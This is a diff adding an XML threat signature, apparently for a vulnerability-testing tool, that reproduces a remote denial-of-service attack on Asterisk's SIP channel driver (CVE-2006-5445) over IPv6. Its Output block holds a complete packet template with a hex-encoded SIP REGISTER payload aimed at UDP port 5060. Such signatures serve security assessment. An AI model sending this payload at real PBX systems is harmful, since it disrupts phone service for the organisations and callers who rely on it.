@@ -1,0 +1,76 @@
+<?xml version="1.0" encoding="utf-8"?>
+<threatSignature>
+  <ThreatProperties>
+    <ExecDesc display="true" value="Asterisk Chan_Sip.c Unspecified Remote Denial of Service Vulnerability (IPv6 Version)"/>
+    <EngDesc display="true" value="This threat leverages a flaw in the SIP Channel driver to cause a denial of service (resource consumption). Asterisk is a PBX application used by many vendors and may be found listening on udp port 5060. (IPv6 Version)"/>
+    <Intent display="true">
+      <item value="Denial_of_Service"/>
+    </Intent>
+    <Protocol display="true" value="SIP/IPv6"/>
+    <Type_Of_Equipment display="true">
+      <item value="Application"/>
+      <item value="VoIP_Equipment"/>
+    </Type_Of_Equipment>
+    <Known_Vendors_Affected display="true">
+      <item value="Asterisk"/>
+    </Known_Vendors_Affected>
+    <Known_Products_Affected display="true">
+      <item value="Asterisk_Asterisk"/>
+    </Known_Products_Affected>
+    <Known_Versions_Affected display="true">
+      <item value="Asterisk_Asterisk_1.2.15"/>
+    </Known_Versions_Affected>
+    <Credit display="true" value="http://www.milw0rm.com/exploits/3407"/>
+    <CVEID display="true" value="CVE-2006-5445"/>
+    <bugtraqID display="true" value="20835"/>
+    <OSVDB display="true" value="29973"/>
+    <Author display="true" value="Mike Davis"/>
+    <ID display="true" value="04e99574ec151317ba4f8bfad8596467"/>
+    <Revision display="true" value="1"/>
+    <Safe display="true" value="true"/>
+    <ServerSideAttack display="true" value="false"/>
+    <SoftwareRevision display="true" value="2.0"/>
+    <Suite display="true" value="Standard"/>
+    <RunOnce display="false" value="false"/>
+    <Valid_Traffic display="false" value="true"/>
+    <AccessVector display="false" value="remote"/>
+    <AccessComplexity display="false" value="low"/>
+    <Authentication display="false" value="not-required"/>
+    <ConfImpact display="false" value="none"/>
+    <IntegImpact display="false" value="none"/>
+    <AvailImpact display="false" value="complete"/>
+    <ImpactBias display="false" value="normal"/>
+    <FirstAdded display="false" value=""/>
+    <LastModified display="false" value="1211987467"/>
+    <SigStyle display="false" value=""/>
+    <targetNode display="false" value=""/>
+    <SigProtocol display="false" value=""/>
+    <Rate display="false" value=""/>
+    <Regex display="false" value=""/>
+    <Created value="1173246633" display="true"/>
+  </ThreatProperties>
+  <Variables>
+    <NamedVar name="sourceMAC" type="ImperfectControls.MacAddress" value="null" index="B"/>
+    <NamedVar name="destMAC" type="ImperfectControls.MacAddress" value="null" index="C"/>
+    <NamedVar name="sourceIP" type="ImperfectControls.IPv6Address" value="null" index="D"/>
+    <NamedVar name="destIP" type="ImperfectControls.IPv6Address" value="null" index="E"/>
+    <NamedVar name="SIPdestPort" type="ImperfectControls.Port" value="null" index="F"/>
+  </Variables>
+  <Loops>
+    <for index="A">
+      <for index="B"/>
+      <for index="C"/>
+      <for index="D"/>
+      <for index="E"/>
+      <for index="F"/>
+    </for>
+  </Loops>
+  <PostScript/>
+  <Output index="A" Count="">
+    <Ethernet srcMac="$sourceMAC" destMac="$destMAC" pktType="0800">
+      <IPv6 Version="06" Priority="00" Flow-Label="000000" Payload-Length="04D8" Next-Header="3A" Hop-Limit="40" Source-Address="$sourceIP" Destination-Address="$destIP">
+        <UDP srcPort="@random(1026,65535)" destPort="$SIPdestPort" checksum="" length="" Payload="524547495354455220202020202020202020202020200D0A5669613A205349502F322E302F554450203139322E3136382E3230342E3133303A353036303B6272616E63683D7A39684734624B31643937653134660D0A4D61782D466F7277617264733A2037300D0A46726F6D3A203C7369703A363636403139322E3136382E3230342E3133303E3B7461673D617332353339343663660D0A546F3A203C7369703A313030403139322E3136382E3230342E3133303E0D0A43616C6C2D49443A203765363461343965356366303138323331323238393338303530653433643362403132372E302E302E310D0A435365713A203130342052454749535445520D0A557365722D4167656E743A20417374657269736B205042580D0A457870697265733A203132300D0A436F6E746163743A203C7369703A363636403139322E3136382E3230342E3133303E0D0A4576656E743A20726567697374726174696F6E0D0A436F6E74656E742D4C656E6774683A2030"/>
+      </IPv6>
+    </Ethernet>
+  </Output>
+</threatSignature>
